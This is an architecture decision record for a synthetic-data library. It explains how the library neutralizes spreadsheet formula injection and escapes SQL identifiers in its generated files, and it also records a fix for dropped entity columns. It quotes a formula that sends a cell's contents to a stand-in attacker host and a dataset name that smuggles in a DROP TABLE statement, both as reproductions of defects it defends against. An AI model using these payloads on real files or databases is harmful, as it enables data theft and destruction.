# ADR-0028: Generated files are untrusted input to whatever opens them

- Status: Accepted
- Owner: Karl (implemented by Claude Code)
- Date: 2026-09-03

## Context

The external assessment's F-07 and F-08. Both are output injection: chaff
never opens the files it writes, so neither can hurt chaff. The impact lands
entirely on the consumer — the colleague who opens the CSV in Excel, the DBA
who runs the `.sql`.

Both reproduced on the merged tree:

- **F-07.** `_delimited` wrote values raw and the Excel encoder assigned raw
  strings to cells. `=HYPERLINK("http://evil/"&A1,"click")` arrived in the CSV
  as a live formula, and openpyxl typed the same string as `data_type == "f"`
  in the workbook.
- **F-08.** `_sql_ident` wrapped T-SQL identifiers in brackets without
  escaping a closing bracket. A dataset named `x]; DROP TABLE audit;--`
  produced `CREATE TABLE [x]; DROP TABLE audit;--] (` — the bracket closes
  the identifier and the rest is a statement.

What makes these reachable rather than theoretical is that **a spec is a
shareable artifact**. That is the point of the library, and ADR-0027 just
made specs *more* shareable by removing the reason not to pass them around.
Person A writes the spec; person B generates it and opens the result. A
constant value, a `choice` list or a column name is all it takes.

## Decision

### 1. Formula neutralization asks whether a value can reach outside its cell

The obvious remedy — OWASP's, and the one the report suggests — is to prefix
every value starting with `=`, `+`, `-`, `@`, tab or CR with an apostrophe.
That is wrong here, and measurably so. Across the twelve example specs, 131
of 52,658 generated string values start with a formula lead, and **every one
is a phone number**:

```
crm_contacts.phone      59 hits   +1-289-253-5482x18761
crm_contacts_geo.phone  72 hits   +1-341-672-6998
```

Blanket-prefixing writes `'+1-289-253-5482x18761` into the flagship CRM
preset. chaff exists so someone can open the output and walk into a demo
(North Star); a guard that visibly corrupts the most demo-facing column in
the catalogue is not a safe default, it is a different defect.

So the default mode (`smart`) asks a sharper question than "what does this
start with":

> Can this value reach outside its own cell?

`=`, `@`, tab and CR are unambiguous formula leads and are always
neutralized. A leading `+` or `-` can only reach beyond its own cell through
a **function call** (`NAME(`), a **DDE pipe** (`|`), a **sheet or workbook
reference** (`!`), or a **UNC path** (`\\`). Without one of those it is
arithmetic over literals — it cannot fetch, execute or exfiltrate — and that
is exactly what a phone number is.

Measured outcome: all 10 attack strings neutralized, all 8 benign demo values
untouched.

### 2. Only strings are considered

Numbers pass through. An int of `-42` is a number in every encoder that calls
the guard, and quoting it would turn numeric data into text — the same class
of damage, applied to every negative number in every dataset.

### 3. .xlsx gets a strictly better fix than .csv

The apostrophe is a CSV-format limitation, not a design preference: a CSV has
no way to say "this cell is text", so the prefix is visible in the opened
file. An `.xlsx` does have one. openpyxl types a string starting with `=` as
a formula; forcing the cell back to a string stores the exact text the
generator produced, with **no apostrophe and no mangling**. `quotePrefix` is
the second half, keeping it text if someone clicks in and presses Enter.

So in Excel output the guard is invisible even under `strict`. Only the
delimited encoders pay the apostrophe.

### 4. Three modes, and an unknown one raises

`output.options.formula_guard`:

| mode | behavior |
|---|---|
| `smart` (default) | always escape `= @ tab CR`; escape `+ -` only when the value can reach outside its cell |
| `strict` | escape every formula lead, phone numbers included |
| `off` | the report's "explicit trusted-formula mode" — emit formulas as written |

An unrecognized value **raises**. A typo'd `"stict"` that quietly fell back
to a default would be a guard that reads as enabled and is not — the exact
failure shape of F-01 and F-02.

### 5. SQL identifiers escape their own delimiter

`]` doubles to `]]` inside brackets; `"` already doubled to `""` inside double
quotes. We escape rather than restrict the grammar: column names are
deliberately permissive because office Joe types freely, and `ColumnSpec`
only forbids empty and whitespace-padded names. The delimiter is therefore
the only thing between a name and the surrounding statement, and doubling it
is what both dialect families define.

## Consequences

- CSV and TSV output changes for values that would have been formulas. No
  example dataset changes: the 131 phone numbers are untouched under `smart`.
- `.xlsx` output for a formula-leading string changes from a formula cell to
  a string cell. That is the fix.
- Generated `.sql` for a name containing `]` or `"` changes to correctly
  escaped output.
- `strict` mode will mangle phone numbers. That is its documented job, and it
  is opt-in.

## Residual

Under `smart`, a value like `+1+1` or `-A1` still reaches the spreadsheet as
a formula. It can compute a number or read a neighbouring cell in a file
chaff itself generated; it cannot call out, fetch, or execute. Anyone who
wants no formulas at all sets `formula_guard: "strict"` and accepts the
apostrophes. Stating the residual is the point — a guard whose limits are
undocumented gets trusted past them.

Generated SQL remains untrusted text: chaff escapes identifiers correctly,
but a `.sql` file is a program, and running one from an untrusted spec is
running someone else's program. The README says so.

## Appendix: a second defect, found while fixing the first

Rewriting `_delimited` to escape headers meant dropping `csv.DictWriter`
(escaped fieldnames no longer match the row keys). That surfaced an unrelated
bug: **entity specs lose their id and tick columns in every column-oriented
format.**

`iter_entity_rows` puts the entity id and tick number into every snapshot,
but the spec never declares them, so encoders taking their column list from
`spec.columns` either dropped them or refused the row:

- `chaff generate examples/order_lifecycle.json` **crashed** on `main`
  (`dict contains fields not in fieldnames: 'step', 'order_id'`) — a shipped
  preset that could not be generated.
- The same spec exported to SQL **silently** produced a table of
  `status, amount`: 1,200 snapshots with no entity and no time, which is a
  total loss of meaning with no error.

Row-oriented formats (json, ndjson, xml, cot) serialize the row dict and were
never affected. That asymmetry is why it survived: `make check` *validates*
the presets but never *generates* one, so a preset that cannot be encoded
still read green.

Fixed with `engine.encode_view()` — the same shape as `table_views()`, a view
whose columns include what the engine supplies — applied at the three places
a spec meets its rows (blob run, stream run, API download). The synthesized
columns name an unregistered generator (`__engine_supplied__`) on purpose, so
anything that ever tries to *generate* from an encode view fails loudly
instead of inventing values.

The gap is closed by a test that generates and encodes **every** example spec
in its own declared format, so a preset that cannot be produced can no longer
pass as green.
